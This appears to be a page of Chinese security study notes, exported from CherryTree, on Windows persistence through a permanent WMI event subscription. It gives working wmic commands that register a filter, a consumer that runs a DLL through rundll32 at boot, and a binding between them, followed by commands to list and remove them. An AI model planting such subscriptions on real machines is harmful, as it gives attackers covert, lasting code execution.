<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>WMI订阅</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>WMI订阅</h1><br/>安装永久 WMI 事件订阅，需要执行以下三步：<br />    1. 注册事件过滤器 – 也就是感兴趣的事件，或者说触发条件<br />    2. 注册事件消费者 – 指定触发事件时要执行的操作<br />    3. 绑定事件消费者和过滤器 – 将事件过滤器和事件消费者绑定，以在事件触发时执行指定操作。<br />    <br />通过 PowerShell 注册 WMI 永久事件过滤实现持久化的代码<br /><a href=""><img src="images\546-1.png" alt="images\546-1.png" /></a><br /><br /><br />注册的事件会在系统启动时间 120 后收到通知<br />执行 CMD 命令调用 Rundll32 加载我们指定的 DLL 并执行其导出函数<br /><br />//添加一个 event filter<br />wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;myEventFilter&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 20 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;<br /><br />//添加一个事件消费者<br />wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;myConsumer&quot;, ExecutablePath=&quot;C:\Windows\System32\cmd.exe&quot;,CommandLineTemplate=&quot; /c Rundll32 C:\topsec.dll RunProc&quot;<br /><br />//绑定事件及消费者<br />wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;myEventFilter\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;myConsumer\&quot;&quot;<br /><br /><br /><br />使用 AutoRun 工具可以查看WMI相关信息<br /><br />查看<br />wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter GET __RELPATH /FORMAT:list<br />wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list<br />wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list<br /><br />清除<br />wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter where Name=&quot;myEventFilter&quot; delete<br />wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer where Name=&quot;myConsumer&quot; delete<br />wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding  where Filter=&#39;__EventFilter.Name=&quot;myEventFilter&quot;&#39; delete<br /><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>